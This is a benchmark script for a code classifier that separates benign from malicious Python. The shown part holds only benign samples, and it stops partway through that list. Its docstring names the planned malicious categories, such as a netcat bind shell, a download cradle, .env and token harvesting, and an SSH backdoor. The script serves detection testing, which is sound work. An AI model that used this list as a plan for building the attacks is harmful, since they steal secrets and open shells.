"""
ScriptGuard CodeBERT Classifier — Benchmark Script v3
======================================================
Expanded benchmark: 60 benign + 60 plain malicious + 60 obfuscated malicious = 180 total.

New in v3 (30 additional samples per category):
  Benign (+30):
    - Rich/Textual TUI apps, FastAPI + dependency injection, httpx async client,
      APScheduler cron job, Typer CLI, Jinja2 templating, Redis pub/sub,
      NumPy signal processing, OpenCV image resize, Plotly dash app,
      tenacity retry decorator, structlog JSON logging, pytest parametrize,
      Poetry script entry point, PyYAML config loader, tarfile archiving,
      zipfile extraction, ftplib download, imaplib email reader,
      telnetlib device probe, xml.etree parsing, configparser INI loader,
      threading event flag, concurrent.futures executor, uuid generation,
      enum state machine, functools LRU cache, itertools combinations,
      Decimal precision arithmetic, datetime timezone utility

  Plain malicious (+30):
    - RDP password spray (rdp3), ICMP exfiltration via scapy, SQL injection dropper,
      FTP credential brute-force, Linux cron persistence, registry Run key,
      DLL side-loading stub, PowerShell download cradle via subprocess,
      /etc/passwd reader+exfil, .ssh/authorized_keys backdoor,
      netcat bind shell, LD_PRELOAD hijack stub, Python package supply-chain stub,
      Slack webhook exfil, GitHub token scan, Discord C2 bot,
      raw socket SYN scanner, SMB share enumeration, sudo -l recon,
      crontab -l dump, /proc/net scraper, Docker socket abuse,
      pip install trojan, SSRF server-side probe, DNS rebinding setup,
      Git credentials theft, browser history stealer, .env file harvester,
      AWS metadata SSRF, Kubernetes service account token stealer

  Obfuscated (+30):
    - Unicode identifier obfuscation, exec via __loader__.exec_module,
      f-string payload injection, functools.reduce char rebuild,
      bytes.translate Caesar cipher + exec, string.Template substitution exec,
      importlib.machinery.SourceFileLoader abuse, ctypes string_at to exec,
      zip(range, bytes) XOR, base85 decode + exec,
      class decorator with __init_subclass__ hook, property getter side effect,
      __del__ destructor payload, threading.Timer deferred exec,
      atexit callback payload, gc.callbacks injection, warnings.simplefilter hook,
      codec lookup table exec, io.StringIO + tokenize abuse,
      collections.OrderedDict subclass with __missing__, struct.pack/unpack ROP,
      operator.methodcaller chain, contextlib.suppress + exec, zipimport abuse,
      linecache.getline exec, copyreg dispatch table, weakref finalizer payload,
      __format__ dunder override, frame locals injection via ctypes,
      pickle Protocol 2 opcode RCE

Usage:
    python test_benchmark_codebert_v3.py
    python test_benchmark_codebert_v3.py --url http://localhost:8000 --threshold 0.5
    python test_benchmark_codebert_v3.py --verbose
    python test_benchmark_codebert_v3.py --json-out results.json
"""

import argparse
import json
import statistics
import sys
import time
from dataclasses import dataclass
from typing import Optional

try:
    import requests
except ImportError:
    sys.exit("requests library required:  pip install requests")

# ============================================================================
# Test cases
# ============================================================================

@dataclass
class TestCase:
    description: str
    expected: str      # "benign" | "malicious"
    code: str


# --------------------------------------------------------------------------
# 30 benign samples
# --------------------------------------------------------------------------

BENIGN_SAMPLES: list[TestCase] = [
    TestCase(
        description="hello world",
        expected="benign",
        code='print("Hello, World!")\n',
    ),
    TestCase(
        description="fibonacci generator",
        expected="benign",
        code="""
def fibonacci(n):
    a, b = 0, 1
    for _ in range(n):
        yield a
        a, b = b, a + b

print(list(fibonacci(10)))
""",
    ),
    TestCase(
        description="file read and word count",
        expected="benign",
        code="""
import sys
from pathlib import Path

def word_count(path: str) -> dict:
    counts = {}
    for word in Path(path).read_text().split():
        counts[word] = counts.get(word, 0) + 1
    return counts

if __name__ == "__main__":
    for word, n in sorted(word_count(sys.argv[1]).items()):
        print(f"{word}: {n}")
""",
    ),
    TestCase(
        description="HTTP GET with requests",
        expected="benign",
        code="""
import requests

def fetch_json(url: str) -> dict:
    response = requests.get(url, timeout=10)
    response.raise_for_status()
    return response.json()

data = fetch_json("https://api.github.com/zen")
print(data)
""",
    ),
    TestCase(
        description="pandas data analysis",
        expected="benign",
        code="""
import pandas as pd
import numpy as np

df = pd.DataFrame({
    "name": ["Alice", "Bob", "Charlie"],
    "score": [88, 92, 75],
})

print(df.describe())
print(df[df["score"] > 80]["name"].tolist())
""",
    ),
    TestCase(
        description="Flask web endpoint",
        expected="benign",
        code="""
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "ok"})

@app.route("/echo", methods=["POST"])
def echo():
    data = request.get_json()
    return jsonify(data)

if __name__ == "__main__":
    app.run(debug=True)
""",
    ),
    TestCase(
        description="argparse + sha256 file hasher",
        expected="benign",
        code="""
import argparse
import hashlib

def compute_hash(path: str, algo: str = "sha256") -> str:
    h = hashlib.new(algo)
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("file")
    parser.add_argument("--algo", default="sha256")
    args = parser.parse_args()
    print(compute_hash(args.file, args.algo))
""",
    ),
    TestCase(
        description="psutil process listing",
        expected="benign",
        code="""
import psutil

for proc in psutil.process_iter(["pid", "name", "cpu_percent", "memory_info"]):
    try:
        info = proc.info
        mem_mb = info["memory_info"].rss / 1024 / 1024
        print(f'{info["pid"]:6}  {info["name"]:<30}  {mem_mb:8.1f} MB')
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        pass
""",
    ),
    TestCase(
        description="paramiko SSH remote exec (devops)",
        expected="benign",
        code="""
import paramiko

def run_remote(host, user, key_path, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=host, username=user, key_filename=key_path)
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    client.close()
    return output

result = run_remote("192.168.1.10", "deploy", "~/.ssh/id_rsa", "uptime")
print(result)
""",
    ),
    TestCase(
        description="SQLite CRUD",
        expected="benign",
        code="""
import sqlite3

conn = sqlite3.connect(":memory:")
cur = conn.cursor()
cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT)")
cur.executemany(
    "INSERT INTO users (name, email) VALUES (?, ?)",
    [("Alice", "alice@example.com"), ("Bob", "bob@example.com")],
)
conn.commit()
for row in cur.execute("SELECT * FROM users"):
    print(row)
conn.close()
""",
    ),
    TestCase(
        description="smtplib send email (notification script)",
        expected="benign",
        code="""
import smtplib
from email.mime.text import MIMEText

def send_notification(to_addr: str, subject: str, body: str) -> None:
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = "alerts@example.com"
    msg["To"] = to_addr
    with smtplib.SMTP("smtp.example.com", 587) as server:
        server.starttls()
        server.login("alerts@example.com", "app_password")
        server.send_message(msg)

send_notification("ops@example.com", "Deploy succeeded", "v2.3.1 is live.")
""",
    ),
    TestCase(
        description="JSON config loader with validation",
        expected="benign",
        code="""
import json
from pathlib import Path
from typing import Any

REQUIRED_KEYS = {"host", "port", "database"}

def load_config(path: str) -> dict[str, Any]:
    cfg = json.loads(Path(path).read_text())
    missing = REQUIRED_KEYS - cfg.keys()
    if missing:
        raise ValueError(f"Config missing required keys: {missing}")
    return cfg

cfg = load_config("config.json")
print(f"Connecting to {cfg['host']}:{cfg['port']}/{cfg['database']}")
""",
    ),
    TestCase(
        description="logging setup boilerplate",
        expected="benign",
        code="""
import logging
import sys

def setup_logging(level: str = "INFO") -> logging.Logger:
    log = logging.getLogger("app")
    log.setLevel(level)
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    log.addHandler(handler)
    return log

logger = setup_logging("DEBUG")
logger.info("Application started")
logger.debug("Debug mode active")
""",
    ),
    TestCase(
        description="pytest unit tests for calculator",
        expected="benign",
        code="""
def add(a, b): return a + b
def sub(a, b): return a - b
def mul(a, b): return a * b
def div(a, b):
    if b == 0:
        raise ZeroDivisionError("Cannot divide by zero")
    return a / b

def test_add():    assert add(2, 3) == 5
def test_sub():    assert sub(5, 3) == 2
def test_mul():    assert mul(4, 5) == 20
def test_div():    assert div(10, 2) == 5.0
def test_div_zero():
    import pytest
    with pytest.raises(ZeroDivisionError):
        div(1, 0)
""",
    ),
    TestCase(
        description="asyncio HTTP scraper",
        expected="benign",
        code="""
import asyncio
import aiohttp

URLS = [
    "https://httpbin.org/get",
    "https://httpbin.org/ip",
    "https://httpbin.org/uuid",
]

async def fetch(session: aiohttp.ClientSession, url: str) -> dict:
    async with session.get(url) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for url in URLS]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())
""",
    ),
    TestCase(
        description="CSV reader and writer",
        expected="benign",
        code="""
import csv
import io

raw = "name,age,city\\nAlice,30,Warsaw\\nBob,25,Krakow\\nCharlie,35,Gdansk\\n"
reader = csv.DictReader(io.StringIO(raw))
rows = list(reader)

out = io.StringIO()
writer = csv.DictWriter(out, fieldnames=["name", "city"])
writer.writeheader()
for row in rows:
    writer.writerow({"name": row["name"], "city": row["city"]})

print(out.getvalue())
""",
    ),
    TestCase(
        description="dataclass with type annotations",
        expected="benign",
        code="""
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class Product:
    name: str
    price: float
    tags: list[str] = field(default_factory=list)
    discount: Optional[float] = None

    @property
    def final_price(self) -> float:
        if self.discount:
            return self.price * (1 - self.discount)
        return self.price

p = Product("Laptop", 1500.0, tags=["electronics"], discount=0.10)
print(f"{p.name}: {p.final_price:.2f} PLN")
""",
    ),
    TestCase(
        description="Docker SDK container listing",
        expected="benign",
        code="""
import docker

client = docker.from_env()

print("Running containers:")
for container in client.containers.list():
    print(f"  {container.name:<30} {container.status:<12} {container.image.tags}")

print("\\nAll images:")
for image in client.images.list():
    print(f"  {str(image.id)[:19]}  {image.tags}")
""",
    ),
    TestCase(
        description="Click CLI with subcommands",
        expected="benign",
        code="""
import click

@click.group()
def cli():
    pass

@cli.command()
@click.argument("name")
@click.option("--count", default=1, help="Number of greetings")
def greet(name, count):
    for _ in range(count):
        click.echo(f"Hello, {name}!")

@cli.command()
@click.argument("path")
def info(path):
    import os
    stat = os.stat(path)
    click.echo(f"Size: {stat.st_size} bytes")

if __name__ == "__main__":
    cli()
""",
    ),
    TestCase(
        description="matplotlib bar chart to file",
        expected="benign",
        code="""
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

categories = ["Q1", "Q2", "Q3", "Q4"]
values = [120, 145, 98, 167]

fig, ax = plt.subplots()
ax.bar(categories, values, color="steelblue")
ax.set_title("Quarterly Revenue")
ax.set_ylabel("Revenue (k PLN)")
fig.tight_layout()
fig.savefig("revenue.png", dpi=150)
print("Saved revenue.png")
""",
    ),
    # ---------- NEW BENIGN SAMPLES ----------
    TestCase(
        description="asyncio TCP echo server (devops tool)",
        expected="benign",
        code="""
import asyncio

async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    addr = writer.get_extra_info("peername")
    print(f"Connection from {addr}")
    data = await reader.read(1024)
    writer.write(data)
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def main() -> None:
    server = await asyncio.start_server(handle_client, "127.0.0.1", 8888)
    async with server:
        await server.serve_forever()

asyncio.run(main())
""",
    ),
    TestCase(
        description="multiprocessing CPU-bound task pool",
        expected="benign",
        code="""
import multiprocessing
import math

def is_prime(n: int) -> bool:
    if n < 2:
        return False
    for i in range(2, int(math.isqrt(n)) + 1):
        if n % i == 0:
            return False
    return True

if __name__ == "__main__":
    with multiprocessing.Pool(processes=4) as pool:
        candidates = range(1, 10_000)
        primes = [n for n, ok in zip(candidates, pool.map(is_prime, candidates)) if ok]
    print(f"Found {len(primes)} primes below 10000")
""",
    ),
    TestCase(
        description="ctypes calling Windows MessageBox (GUI utility)",
        expected="benign",
        code="""
import ctypes

def show_message(title: str, message: str, style: int = 0) -> int:
    \"\"\"Display a native Windows message box. Returns button ID.\"\"\"
    MB_OK = 0
    return ctypes.windll.user32.MessageBoxW(0, message, title, style | MB_OK)

show_message("ScriptGuard", "Analysis complete — no threats found.")
""",
    ),
    TestCase(
        description="boto3 S3 file sync utility",
        expected="benign",
        code="""
import boto3
import os
from pathlib import Path

def sync_directory_to_s3(local_dir: str, bucket: str, prefix: str = "") -> int:
    s3 = boto3.client("s3")
    uploaded = 0
    for path in Path(local_dir).rglob("*"):
        if path.is_file():
            key = prefix + str(path.relative_to(local_dir)).replace("\\\\", "/")
            s3.upload_file(str(path), bucket, key)
            uploaded += 1
    return uploaded

count = sync_directory_to_s3("./dist", "my-company-releases", "v2.3/")
print(f"Uploaded {count} files to S3")
""",
    ),
    TestCase(
        description="SQLAlchemy ORM model definition",
        expected="benign",
        code="""
from sqlalchemy import Column, Integer, String, DateTime, create_engine
from sqlalchemy.orm import declarative_base, Session
from datetime import datetime

Base = declarative_base()

class User(Base):
    __tablename__ = "users"
    id         = Column(Integer, primary_key=True)
    username   = Column(String(64), unique=True, nullable=False)
    email      = Column(String(120), unique=True)
    created_at = Column(DateTime, default=datetime.utcnow)

engine = create_engine("sqlite:///:memory:")
Base.metadata.create_all(engine)

with Session(engine) as session:
    session.add(User(username="alice", email="alice@example.com"))
    session.commit()
    user = session.query(User).filter_by(username="alice").first()
    print(f"Found: {user.username} ({user.email})")
""",
    ),
    TestCase(
        description="websocket client — live price feed",
        expected="benign",
        code="""
import asyncio
import websockets
import json

async def price_feed(uri: str) -> None:
    async with websockets.connect(uri) as ws:
        await ws.send(json.dumps({"subscribe": "BTC/USD"}))
        for _ in range(5):
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"BTC/USD = {data.get('price', 'N/A')}")

asyncio.run(price_feed("wss://stream.example.com/v1/prices"))
""",
    ),
    TestCase(
        description="Celery background task definition",
        expected="benign",
        code="""
from celery import Celery
import time

app = Celery("tasks", broker="redis://localhost:6379/0", backend="redis://localhost:6379/1")

@app.task(bind=True, max_retries=3)
def send_report(self, user_id: int, report_type: str) -> dict:
    try:
        time.sleep(0.1)  # simulate work
        return {"status": "sent", "user": user_id, "type": report_type}
    except Exception as exc:
        raise self.retry(exc=exc, countdown=60)

if __name__ == "__main__":
    result = send_report.delay(42, "monthly")
    print(f"Task ID: {result.id}")
""",
    ),
    TestCase(
        description="gRPC client stub usage",
        expected="benign",
        code="""
import grpc
from google.protobuf import empty_pb2

def list_services(channel_address: str) -> None:
    channel = grpc.insecure_channel(channel_address)
    # Reflection-based service listing
    from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
    stub = reflection_pb2_grpc.ServerReflectionStub(channel)
    request = reflection_pb2.ServerReflectionRequest(list_services="")
    responses = stub.ServerReflectionInfo(iter([request]))
    for response in responses:
        for service in response.list_services_response.service:
            print(f"  Service: {service.name}")
    channel.close()

list_services("localhost:50051")
""",
    ),
    TestCase(
        description="pytest fixture with tmp_path and monkeypatch",
        expected="benign",
        code="""
import pytest
import os

@pytest.fixture
def config_file(tmp_path):
    cfg = tmp_path / "config.json"
    cfg.write_text('{"debug": true, "port": 9090}')
    return cfg

def load_config(path):
    import json
    return json.loads(open(path).read())

def test_load_config(config_file):
    cfg = load_config(config_file)
    assert cfg["port"] == 9090
    assert cfg["debug"] is True

def test_env_override(config_file, monkeypatch):
    monkeypatch.setenv("APP_PORT", "8080")
    assert os.environ["APP_PORT"] == "8080"
""",
    ),
    TestCase(
        description="Pydantic v2 model with validators",
        expected="benign",
        code="""
from pydantic import BaseModel, field_validator, EmailStr
from typing import Optional

class UserCreate(BaseModel):
    username: str
    email: str
    age: int
    referral_code: Optional[str] = None

    @field_validator("username")
    @classmethod
    def username_alphanumeric(cls, v: str) -> str:
        if not v.isalnum():
            raise ValueError("username must be alphanumeric")
        return v.lower()

    @field_validator("age")
    @classmethod
    def age_must_be_adult(cls, v: int) -> int:
        if v < 18:
            raise ValueError("must be 18 or older")
        return v

user = UserCreate(username="Alice123", email="alice@example.com", age=25)
print(user.model_dump())
""",
    ),
    # ---------- NEW BENIGN SAMPLES v3 ----------
    TestCase(
        description="Rich / Textual TUI progress bar",
        expected="benign",
        code="""
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
import time

tasks_data = [("Downloading model", 3), ("Extracting features", 5), ("Running inference", 2)]

with Progress(SpinnerColumn(), TextColumn("[bold blue]{task.description}"), BarColumn()) as progress:
    for name, duration in tasks_data:
        task = progress.add_task(name, total=duration * 10)
        for _ in range(duration * 10):
            time.sleep(0.05)
            progress.advance(task)

print("All tasks completed.")
""",
    ),
    TestCase(
        description="FastAPI dependency injection and Pydantic",
        expected="benign",
        code="""
from fastapi import FastAPI, Depends, HTTPException
from pydantic import BaseModel
from typing import Annotated

app = FastAPI()

class Item(BaseModel):
    name: str
    price: float
    in_stock: bool = True

def get_db():
    db = {"items": {}}
    try:
        yield db
    finally:
        pass

@app.post("/items/", response_model=Item)
def create_item(item: Item, db: Annotated[dict, Depends(get_db)]):
    db["items"][item.name] = item
    return item

@app.get("/items/{name}")
def read_item(name: str, db: Annotated[dict, Depends(get_db)]):
    if name not in db["items"]:
        raise HTTPException(status_code=404, detail="Item not found")
    return db["items"][name]
""",
    ),
    TestCase(
        description="httpx async client with retry",
        expected="benign",
        code="""
import asyncio
import httpx

async def fetch_with_retry(url: str, retries: int = 3) -> dict:
    async with httpx.AsyncClient(timeout=10.0) as client:
        for attempt in range(retries):
            try:
                r = await client.get(url)
                r.raise_for_status()
                return r.json()
            except (httpx.HTTPError, httpx.TimeoutException) as e:
                if attempt == retries - 1:
                    raise
                await asyncio.sleep(2 ** attempt)

async def main():
    data = await fetch_with_retry("https://api.github.com/zen")
    print(data)

asyncio.run(main())
""",
    ),
    TestCase(
        description="APScheduler cron job",
        expected="benign",
        code="""
from apscheduler.schedulers.blocking import BlockingScheduler
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)

def cleanup_temp_files():
    import tempfile, pathlib, time
    tmp = pathlib.Path(tempfile.gettempdir())
    cutoff = time.time() - 3600
    removed = 0
    for f in tmp.iterdir():
        if f.is_file() and f.stat().st_mtime < cutoff:
            try:
                f.unlink()
                removed += 1
            except PermissionError:
                pass
    logging.info(f"[{datetime.now():%H:%M:%S}] Cleaned {removed} stale temp files")

scheduler = BlockingScheduler()
scheduler.add_job(cleanup_temp_files, "cron", minute="*/30")
print("Scheduler started — Ctrl+C to stop")
scheduler.start()
""",
    ),
    TestCase(
        description="Typer CLI app with callbacks",
        expected="benign",
        code="""
import typer
from pathlib import Path
from typing import Optional

app = typer.Typer()

@app.command()
def convert(
    input_file: Path = typer.Argument(..., help="Input CSV file"),
    output_file: Optional[Path] = typer.Option(None, "--out", "-o"),
    delimiter: str = typer.Option(",", "--delimiter", "-d"),
    verbose: bool = typer.Option(False, "--verbose", "-v"),
):
    \"\"\"Convert a CSV file to JSON.\"\"\"
    import csv, json
    out = output_file or input_file.with_suffix(".json")
    rows = list(csv.DictReader(input_file.open(), delimiter=delimiter))
    out.write_text(json.dumps(rows, indent=2))
    if verbose:
        typer.echo(f"Converted {len(rows)} rows → {out}")

if __name__ == "__main__":
    app()
""",
    ),
    TestCase(
        description="Jinja2 template rendering",
        expected="benign",
        code="""
from jinja2 import Environment, FileSystemLoader, select_autoescape
import pathlib

TEMPLATE_STR = \"\"\"
<!DOCTYPE html>
<html>
<head><title>{{ title }}</title></head>
<body>
  <h1>{{ heading }}</h1>
  <ul>
  {% for item in items %}
    <li>{{ item.name }}: {{ item.value }}</li>
  {% endfor %}
  </ul>
</body>
</html>
\"\"\"

env = Environment(loader=FileSystemLoader("."), autoescape=select_autoescape())
tmpl = env.from_string(TEMPLATE_STR)
html = tmpl.render(
    title="Report",
    heading="Q4 Metrics",
    items=[{"name": "Revenue", "value": "1.2M"}, {"name": "Users", "value": "45k"}],
)
print(html[:200])
""",
    ),
    TestCase(
        description="Redis pub/sub listener",
        expected="benign",
        code="""
import redis
import threading
import json

def publish_events(r: redis.Redis, channel: str, events: list) -> None:
    for event in events:
        r.publish(channel, json.dumps(event))

def subscribe_and_handle(r: redis.Redis, channel: str) -> None:
    pubsub = r.pubsub()
    pubsub.subscribe(channel)
    for message in pubsub.listen():
        if message["type"] == "message":
            data = json.loads(message["data"])
            print(f"Received: {data}")

r = redis.Redis(host="localhost", port=6379, db=0)
channel = "events"

t = threading.Thread(target=subscribe_and_handle, args=(r, channel), daemon=True)
t.start()

publish_events(r, channel, [{"type": "order", "id": 42}, {"type": "payment", "id": 7}])
""",
    ),
    TestCase(
        description="NumPy FFT signal processing",
        expected="benign",
        code="""
import numpy as np

# Generate a composite signal: 5 Hz + 50 Hz sine waves
SAMPLE_RATE = 1000   # samples per second
DURATION    = 1.0    # seconds
t = np.linspace(0, DURATION, int(SAMPLE_RATE * DURATION), endpoint=False)
signal = np.sin(2 * np.pi * 5 * t) + 0.5 * np.sin(2 * np.pi * 50 * t)

# Compute FFT
fft_result = np.fft.rfft(signal)
freqs      = np.fft.rfftfreq(len(signal), 1 / SAMPLE_RATE)
magnitudes = np.abs(fft_result)

# Find dominant frequencies
peaks = freqs[magnitudes > 50]
print(f"Dominant frequencies (Hz): {peaks.tolist()}")
print(f"Signal energy: {np.sum(signal**2):.2f}")
""",
    ),
    TestCase(
        description="OpenCV image resize and grayscale",
        expected="benign",
        code="""
import cv2
import numpy as np

# Create a synthetic test image (gradient)
img = np.zeros((480, 640, 3), dtype=np.uint8)
for i in range(640):
    img[:, i] = [int(i / 640 * 255)] * 3

# Resize to thumbnail
thumb = cv2.resize(img, (160, 120), interpolation=cv2.INTER_AREA)

# Convert to grayscale
gray = cv2.cvtColor(thumb, cv2.COLOR_BGR2GRAY)

# Apply Gaussian blur
blurred = cv2.GaussianBlur(gray, (5, 5), 0)

print(f"Original: {img.shape}")
print(f"Thumbnail: {thumb.shape}")
print(f"Grayscale: {gray.shape}, mean brightness: {gray.mean():.1f}")
""",
    ),
    TestCase(
        description="tenacity retry decorator for flaky API",
        expected="benign",
        code="""
import random
from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type

class TransientError(Exception):
    pass

@retry(
    retry=retry_if_exception_type(TransientError),
    stop=stop_after_attempt(5),
    wait=wait_exponential(multiplier=0.1, min=0.1, max=1),
    reraise=True,
)
def call_external_api(url: str) -> dict:
    if random.random() < 0.6:
        raise TransientError("Service temporarily unavailable")
    return {"status": "ok", "url": url}

try:
    result = call_external_api("https://api.example.com/data")
    print(result)
except TransientError as e:
    print(f"All retries exhausted: {e}")
""",
    ),
    TestCase(
        description="structlog JSON structured logging",
        expected="benign",
        code="""
import structlog
import logging

structlog.configure(
    processors=[
        structlog.stdlib.add_log_level,
        structlog.stdlib.add_logger_name,
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer(),
    ],
    wrapper_class=structlog.stdlib.BoundLogger,
    logger_factory=structlog.stdlib.LoggerFactory(),
)

log = structlog.get_logger("app.service")

def process_order(order_id: int, user_id: int) -> dict:
    log.info("order.received", order_id=order_id, user_id=user_id)
    result = {"order_id": order_id, "status": "processed"}
    log.info("order.completed", order_id=order_id, status="processed")
    return result

process_order(1001, 42)
""",
    ),
    TestCase(
        description="pytest parametrize with fixtures",
        expected="benign",
        code="""
import pytest

def parse_duration(s: str) -> int:
    \"\"\"Parse '5m', '2h', '30s' into seconds.\"\"\"
    units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    if not s or s[-1] not in units:
        raise ValueError(f"Invalid duration: {s!r}")
    return int(s[:-1]) * units[s[-1]]

@pytest.mark.parametrize("input_str,expected", [
    ("30s", 30),
    ("5m", 300),
    ("2h", 7200),
    ("1d", 86400),
])
def test_parse_duration(input_str, expected):
    assert parse_duration(input_str) == expected

@pytest.mark.parametrize("bad_input", ["", "5x", "abc", "10"])
def test_parse_duration_invalid(bad_input):
    with pytest.raises(ValueError):
        parse_duration(bad_input)
""",
    ),
    TestCase(
        description="PyYAML config loader with defaults",
        expected="benign",
        code="""
import yaml
import io
from typing import Any

DEFAULT_CONFIG = \"\"\"
server:
  host: localhost
  port: 8080
  workers: 4
database:
  url: sqlite:///app.db
  pool_size: 10
logging:
  level: INFO
  format: json
\"\"\"

def load_config(yaml_str: str, overrides: dict | None = None) -> dict[str, Any]:
    cfg = yaml.safe_load(yaml_str)
    if overrides:
        for section, values in overrides.items():
            if section in cfg and isinstance(values, dict):
                cfg[section].update(values)
    return cfg

config = load_config(DEFAULT_CONFIG, overrides={"server": {"port": 9090}})
print(f"Server: {config['server']['host']}:{config['server']['port']}")
print(f"DB: {config['database']['url']}")
""",
    ),
    TestCase(
        description="tarfile archive creation and extraction",
        expected="benign",
        code="""
import tarfile
import io
import os

# Create an in-memory tar archive
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tar:
    for name, content in [
        ("README.md", b"# My Project\nA sample project.\n"),
        ("src/main.py", b"print('hello')\n"),
        ("config.json", b'{\"version\": \"1.0\"}\n'),
    ]:
        info = tarfile.TarInfo(name=name)
        info.size = len(content)
        tar.addfile(info, io.BytesIO(content))

print(f"Archive size: {buf.tell()} bytes")

# List contents
buf.seek(0)
with tarfile.open(fileobj=buf, mode="r:gz") as tar:
    for member in tar.getmembers():
        print(f"  {member.name} ({member.size} bytes)")
""",
    ),
    TestCase(
        description="zipfile extraction with path validation",
        expected="benign",
        code="""
import zipfile
import io
import pathlib

def safe_extract(zip_bytes: bytes, dest: pathlib.Path) -> list[str]:
    \"\"\"Extract zip, refusing any path-traversal entries.\"\"\"
    extracted = []
    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
        for member in zf.infolist():
            # Guard against zip-slip
            target = (dest / member.filename).resolve()
            if not str(target).startswith(str(dest.resolve())):
                raise ValueError(f"Path traversal attempt: {member.filename}")
            dest.mkdir(parents=True, exist_ok=True)
            zf.extract(member, dest)
            extracted.append(member.filename)
    return extracted

# Build a tiny demo zip in memory
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr("hello.txt", "Hello, world!")
    zf.writestr("sub/nested.txt", "Nested file")

files = safe_extract(buf.getvalue(), pathlib.Path("/tmp/safe_extract_demo"))
print("Extracted:", files)
""",
    ),
    TestCase(
        description="imaplib email inbox reader",
        expected="benign",
        code="""
import imaplib
import email
from email.header import decode_header

def read_inbox(host: str, user: str, password: str, limit: int = 5) -> list[dict]:
    mail = imaplib.IMAP4_SSL(host)
    mail.login(user, password)
    mail.select("INBOX")
    _, data = mail.search(None, "ALL")
    ids = data[0].split()[-limit:]
    messages = []
    for msg_id in ids:
        _, msg_data = mail.fetch(msg_id, "(RFC822)")
        msg = email.message_from_bytes(msg_data[0][1])
        subject, enc = decode_header(msg["Subject"])[0]
        if isinstance(subject, bytes):
            subject = subject.decode(enc or "utf-8")
        messages.append({"id": msg_id.decode(), "subject": subject, "from": msg["From"]})
    mail.close()
    mail.logout()
    return messages

# Demonstration — would normally pass real credentials
print("IMAP reader ready. Provide host/credentials to connect.")
""",
    ),
    TestCase(
        description="xml.etree sitemap parser",
        expected="benign",
        code="""
import xml.etree.ElementTree as ET
import urllib.request
from datetime import datetime

SAMPLE_XML = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
  <url><loc>https://example.com/</loc><lastmod>2024-01-15</lastmod><priority>1.0</priority></url>
  <url><loc>https://example.com/about</loc><lastmod>2024-01-10</lastmod><priority>0.8</priority></url>
  <url><loc>https://example.com/contact</loc><lastmod>2023-12-01</lastmod><priority>0.5</priority></url>
</urlset>\"\"\"

NS = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
root = ET.fromstring(SAMPLE_XML)

urls = []
for url_el in root.findall("sm:url", NS):
    loc  = url_el.findtext("sm:loc", namespaces=NS)
    mod  = url_el.findtext("sm:lastmod", namespaces=NS)
    prio = float(url_el.findtext("sm:priority", default="0.5", namespaces=NS))
    urls.append({"loc": loc, "lastmod": mod, "priority": prio})

for u in sorted(urls, key=lambda x: x["priority"], reverse=True):
    print(f"[{u['priority']:.1f}] {u['loc']}  (last: {u['lastmod']})")
""",
    ),
    TestCase(
        description="configparser INI config manager",
        expected="benign",
        code="""
import configparser
import io

INI = \"\"\"
[DEFAULT]
timeout = 30
retry = 3

[production]
host = prod.db.example.com
port = 5432
timeout = 60

[staging]
host = staging.db.example.com
port = 5433
\"\"\"

parser = configparser.ConfigParser()
parser.read_string(INI)

for section in ["production", "staging"]:
    cfg = parser[section]
    print(f"[{section}]")
    print(f"  host={cfg['host']}  port={cfg['port']}  timeout={cfg['timeout']}  retry={cfg['retry']}")
""",
    ),
    TestCase(
        description="threading Event flag producer/consumer",
        expected="benign",
        code="""
import threading
import time
import queue

def producer(q: queue.Queue, stop: threading.Event, n: int) -> None:
    for i in range(n):
        if stop.is_set():
            break
        q.put(f"item-{i}")
        time.sleep(0.01)
    q.put(None)  # sentinel

def consumer(q: queue.Queue) -> list:
    results = []
    while True:
        item = q.get()
        if item is None:
            break
        results.append(item)
    return results

stop_event = threading.Event()
work_queue: queue.Queue = queue.Queue(maxsize=10)

p = threading.Thread(target=producer, args=(work_queue, stop_event, 5))
p.start()
items = consumer(work_queue)
p.join()

print(f"Processed {len(items)} items: {items}")
""",
    ),
    TestCase(
        description="concurrent.futures thread pool file processor",
        expected="benign",
        code="""
import concurrent.futures
import hashlib
import pathlib
import os

def hash_file(path: pathlib.Path) -> tuple[str, str]:
    h = hashlib.sha256()
    h.update(path.read_bytes())
    return str(path), h.hexdigest()

def hash_directory(directory: str, max_workers: int = 4) -> dict[str, str]:
    files = [p for p in pathlib.Path(directory).rglob("*") if p.is_file()]
    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_path = {executor.submit(hash_file, f): f for f in files}
        for future in concurrent.futures.as_completed(future_to_path):
            path, digest = future.result()
            results[path] = digest
    return results

